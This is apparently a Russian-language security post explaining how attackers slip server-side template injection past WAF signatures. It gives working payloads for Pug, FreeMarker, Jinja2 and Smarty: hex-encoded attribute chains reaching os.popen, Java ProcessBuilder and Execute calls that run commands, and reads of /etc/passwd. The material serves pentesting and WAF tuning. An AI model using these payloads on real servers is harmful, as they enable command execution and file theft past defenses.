🧐**Как атакующие обходят WAF: server-side template injection**

В прошлый раз мы разбирали варианты обхода WAF при command injection, сегодня — техники обхода для SSTI.

SSTI возникает, когда пользовательский ввод попадает в шаблон на сервере, позволяя выполнить произвольный код. WAF пытается блокировать такие атаки, анализируя запросы на наличие характерных конструкций и опасных функций.

WAF при поиске SSTI ориентируется на следующие индикаторы:

🔵 Синтаксис шаблонов — любые конструкции, которые могут быть интерпретированы серверным шаблонизатором: фигурные скобки {{ ... }}, {% ... %}, ${ ... }, #{ ... }, угловые скобки <%= ... %>, а также служебные символы вроде круглых скобок, кавычек и подчеркиваний.

🔵 Ключевые слова и встроенные объекты — типовые цепочки вызовов, например __globals__, __class__, os, popen, system, eval (для Python), runtime, ProcessBuilder (для Java), а также объекты окружения вроде request, application, config.

🔵 Детект вызываемых функций — WAF отслеживает вызовы функций, которые могут выполнить код или прочитать файл: read(), popen(), exec(), getRuntime(), check_output(). Даже если они вызываются не напрямую, их упоминание может быть заблокировано.

Задача атакующего — обойти каждый из этих уровней так, чтобы запрос остался рабочим для шаблонизатора, но не попал под сигнатуры WAF.

**Техники обхода**

1️⃣ Обходим проверки синтаксиса шаблонов.

WAF ищет характерные обрамления: {{, }}, ${, %} и т. д. Если замаскировать их или заменить на менее очевидные аналоги, детект можно обойти.

🟦Альтернативный синтаксис в Pug.

В Pug вместо {{ }} используется !{ ... } для неэкранированного вывода. WAF, настроенный на поиск {{, может пропустить такую конструкцию.

```!{global.process.mainModule.require('child_process').execSync('id').toString()}```

🟦Использование директив вместо выражений (FreeMarker).

Вместо ${...} применяется директива <#assign ...>, которая не всегда попадает в сигнатуры.

```<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}```

2️⃣Обходим проверку прямых вызовов функций.

WAF содержит черные списки строк: __globals__, os, system, runtime и т. д. Обход строится на динамическом формировании этих имен или использовании обходных путей к объектам.

🟦Hex-кодирование.

Используется для обхода детекта ____globals____,__ __class____ и других ключевых слов с подчеркиваниями. Многие WAF проверяют ASCII-строки, но могут не обрабатывать hex-последовательности, тогда как шаблонизаторы (например, Jinja2) их прекрасно понимают. Для обхода запрета на точку (.) используется замена оператора на фильтр |attr.

```{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f') }}```

🟦Использование встроенных классов FreeMarker.

Вместо Runtime.exec() применяются встроенные утилиты FreeMarker: Execute и ObjectConstructor. Они реже попадают в сигнатуры.

```<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder", "id").start()}```

3️⃣Обход детекта вызываемых функций.

WAF блокирует вызовы методов вроде read(), popen(), exec(), getRuntime(). Это препятствие можно обойти, разбивая вызов на несколько шагов либо используя методы, которые не входят в типовой черный список.

🟦Использование нескольких тегов {%set %} для атаки вместо одного выражения.

Каждый шаг по отдельности не вызывает подозрений, а опасный метод read() вызывается лишь в конце.

```{%set x=lipsum|attr("\x5f\x5fglobals\x5f\x5f")%}{%set y=x|attr("\x5f\x5fgetitem\x5f\x5f")%}{%set z=y("os")%}{%set a=z|attr("popen")%}{%set b=a("id")%}{%set c=b|attr("read")%}{{c()}}```

🟦Обращение к нестандартным объектам (Smarty).

Вместо вызова system используются функции чтения файлов, которые не ассоциируются с выполнением команд, но позволяют получить содержимое файлов.

```{include file='/etc/passwd'}

{file_get_contents('/etc/passwd')}```
